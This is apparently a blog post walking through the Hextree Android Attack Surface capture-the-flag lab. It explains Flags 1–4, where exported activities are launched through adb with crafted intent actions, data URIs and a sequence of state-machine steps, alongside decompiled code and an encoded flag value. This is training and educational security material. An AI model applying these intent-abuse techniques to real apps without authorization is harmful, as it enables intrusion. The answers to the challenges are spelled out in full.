
---
title: Hextree Android Attack Surface
date: 2026-02-10
categories: [Android Security]
tags: [Android, HexTree]
layout: post
---

# Hextree Android Attack Surface

## Tip

- In another terminal, use:

```bash
adb logcat --pid=$(adb shell pidof io.hextree.attacksurface)
````

* Since all flags are logged when you get them, it will make it easier just to copy them from logcat.

## Activity

### Flag 1 - Basic exported activity

* In `AndroidManifest.xml` notice the activity is exported:

```bash
<activity
    android:name="io.hextree.attacksurface.activities.Flag1Activity"
    android:exported="true"/>
```

* Call it using adb:

```bash
adb shell am start-activity -n io.hextree.attacksurface/io.hextree.attacksurface.activities.Flag1Activity
```

* **Explanation:** This activity is simply exported and does not require any extra intent parameters. Launching it directly triggers the flag.

---

### Flag 2 - Intent with extras

* In `AndroidManifest.xml` notice the activity is exported:

```bash
<activity
    android:name="io.hextree.attacksurface.activities.Flag2Activity"
    android:exported="true">
     <intent-filter>
          <action android:name="io.hextree.action.GIVE_FLAG"/>
     </intent-filter>
 </activity>
```

* Notice the intent requires the action string to work:

```bash
String action = getIntent().getAction();
if (action == null || !action.equals("io.hextree.action.GIVE_FLAG")) {
    return;
}
this.f.addTag(action);
success(this);
```

* Using adb:

```bash
adb shell am start-activity \
  -n io.hextree.attacksurface/io.hextree.attacksurface.activities.Flag2Activity \
  -a io.hextree.action.GIVE_FLAG
```

* **Explanation:** This activity only grants the flag if the intent contains a specific `action` string. Using `-a io.hextree.action.GIVE_FLAG` ensures we satisfy this condition.

---

### Flag 3 - Intent with a data URI

* In `AndroidManifest.xml` notice the activity is exported:

```bash
<activity
    android:name="io.hextree.attacksurface.activities.Flag3Activity"
    android:exported="true">
    <intent-filter>
        <action android:name="io.hextree.action.GIVE_FLAG"/>
        <data android:scheme="https"/>
    </intent-filter>
</activity>
```

* Notice the logic:

```bash
Intent intent = getIntent();
String action = intent.getAction();
if (action == null || !action.equals("io.hextree.action.GIVE_FLAG")) {
    return;
}
this.f.addTag(action);
Uri data = intent.getData();
if (data == null || !data.toString().equals("https://app.hextree.io/map/android")) {
    return;
}
this.f.addTag(data);
success(this);
```

* Using adb:

```bash
adb shell am start-activity \
  -n io.hextree.attacksurface/io.hextree.attacksurface.activities.Flag3Activity \
  -a io.hextree.action.GIVE_FLAG \
  -d https://app.hextree.io/map/android
```

* **Explanation:** This activity requires both an `action` and a **specific data URI**. The `-d` option passes the URI. Only when both match does the activity add the tag and trigger the flag.

---

### Flag 4 - State machine

* In `AndroidManifest.xml` notice the activity is exported:

```bash
<activity
    android:name="io.hextree.attacksurface.activities.Flag4Activity"
    android:exported="true"/>
```

* Flag4 activity logic:

```bash
public Flag4Activity() {
    this.name = "Flag 4 - State machine";
    this.flag = "2ftukoQ59QLkG42FGkCkdyK7+Jwi0uY7QfC2sPyofRcgvI+kzSIwqP0vMJ9fCbRn";
}

public enum State {
    INIT(0),
    PREPARE(1),
    BUILD(2),
    GET_FLAG(3),
    REVERT(4);

    private final int value;

    State(int i) {
        this.value = i;
    }

    public int getValue() {
        return this.value;
    }

    public static State fromInt(int i) {
        for (State state : values()) {
            if (state.getValue() == i) {
                return state;
            }
        }
        return INIT;
    }
}
```

* State machine logic:

```bash
public void stateMachine(Intent intent) {
    String action = intent.getAction();
    int iOrdinal = getCurrentState().ordinal();
    if (iOrdinal != 0) {
        if (iOrdinal != 1) {
            if (iOrdinal != 2) {
                if (iOrdinal == 3) {
                    this.f.addTag(State.GET_FLAG);
                    setCurrentState(State.INIT);
                    success(this);
                    Log.i("Flag4StateMachine", "solved");
                    return;
                }
                if (iOrdinal == 4 && "INIT_ACTION".equals(action)) {
                    setCurrentState(State.INIT);
                    Toast.makeText(this, "Transitioned from REVERT to INIT", 0).show();
                    Log.i("Flag4StateMachine", "Transitioned from REVERT to INIT");
                    return;
                }
            } else if ("GET_FLAG_ACTION".equals(action)) {
                setCurrentState(State.GET_FLAG);
                Toast.makeText(this, "Transitioned from BUILD to GET_FLAG", 0).show();
                Log.i("Flag4StateMachine", "Transitioned from BUILD to GET_FLAG");
                return;
            }
        } else if ("BUILD_ACTION".equals(action)) {
            setCurrentState(State.BUILD);
            Toast.makeText(this, "Transitioned from PREPARE to BUILD", 0).show();
            Log.i("Flag4StateMachine", "Transitioned from PREPARE to BUILD");
            return;
        }
    } else if ("PREPARE_ACTION".equals(action)) {
        setCurrentState(State.PREPARE);
        Toast.makeText(this, "Transitioned from INIT to PREPARE", 0).show();
        Log.i("Flag4StateMachine", "Transitioned from INIT to PREPARE");
        return;
    }
    Toast.makeText(this, "Unknown state. Transitioned to INIT", 0).show();
    Log.i("Flag4StateMachine", "Unknown state. Transitioned to INIT");
    setCurrentState(State.INIT);
}
```

* Use adb to trigger state transitions:

#### INIT → PREPARE

```bash
adb shell am start-activity \
  -n io.hextree.attacksurface/io.hextree.attacksurface.activities.Flag4Activity \
  -a PREPARE_ACTION
```

#### PREPARE → BUILD

```bash
adb shell am start-activity \
  -n io.hextree.attacksurface/io.hextree.attacksurface.activities.Flag4Activity \
  -a BUILD_ACTION
```

#### BUILD → GET_FLAG

```bash
adb shell am start-activity \
  -n io.hextree.attacksurface/io.hextree.attacksurface.activities.Flag4Activity \
  -a GET_FLAG_ACTION
```

#### GET_FLAG → SUCCESS

*(action doesn’t matter here)*

```bash
adb shell am start-activity \
  -n io.hextree.attacksurface/io.hextree.attacksurface.activities.Flag4Activity
```

* This call hits:

```bash
if (iOrdinal == 3) {
    success(this);
}
```

* **Explanation:** Flag4 uses a **state machine**. Each action moves the internal state forward:

  1. `PREPARE_ACTION` → moves from INIT → PREPARE
  2. `BUILD_ACTION` → moves from PREPARE → BUILD
  3. `GET_FLAG_ACTION` → moves from BUILD → GET_FLAG
  4. Final call triggers the flag when in GET_FLAG state.

  Without following the correct sequence, the flag won’t be granted.



